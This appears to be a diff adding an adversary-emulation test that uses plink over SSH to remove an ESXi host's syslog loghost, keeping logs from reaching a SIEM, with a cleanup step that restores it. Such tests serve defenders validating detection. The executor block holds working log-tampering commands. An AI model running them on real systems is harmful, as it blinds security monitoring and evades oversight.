@@ -315,5 +315,73 @@ atomic_tests:
     cleanup_command: 'rm -rf #{input_folder}'
     name: bash
     elevation_required: false
+- name: ESXi - Remove Syslog remote IP
+  auto_generated_guid: 36c62584-d360-41d6-886f-d194654be7c2
+  description: |
+    An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name of the ESXi Server
+      type: string
+      default: atomic.local
+    plink_file:
+      description: Path to Putty
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    username:
+      description: Username used to log into ESXi
+      type: string
+      default: root
+    password:
+      description: password used to log into ESXI
+      type: string
+      default: n/a
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The plink executable must be found in the ExternalPayloads folder.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+      # Extract line with IP address from the syslog configuration output
+      #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt
+      
+      # Replace the IP with "0"
+      #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt
+      
+      # Extract the IP from the line extracted from findstr
+      $inputFilePath = "c:\temp\loghost.txt"
+      $outputFilePath = "c:\temp\loghost_ip.txt"
+
+      $fileContent = Get-Content -Path $inputFilePath -Raw
+
+      if ([string]::IsNullOrWhiteSpace($fileContent)) {
+          Write-Host "The content is $fileContent"
+          Write-Host "The file is empty"
+      } else {
+          # Use a regular expression to extract IP addresses
+          $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value
+          
+          $output = "esxcli system syslog config set --loghost=" + $ipAddresses
+
+          $output | Out-File -FilePath $outputFilePath -Encoding ascii
+          
+          Write-Host "IP addresses extracted and saved to $outputFilePath"
+      }
+
+    cleanup_command: |
+      # Re-add the initially extracted IP
+      #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\temp\loghost_ip.txt
+      
+      rm c:\temp\loghost_ip.txt
+      rm c:\temp\loghost.txt
+    name: powershell
+    elevation_required: true
 
   
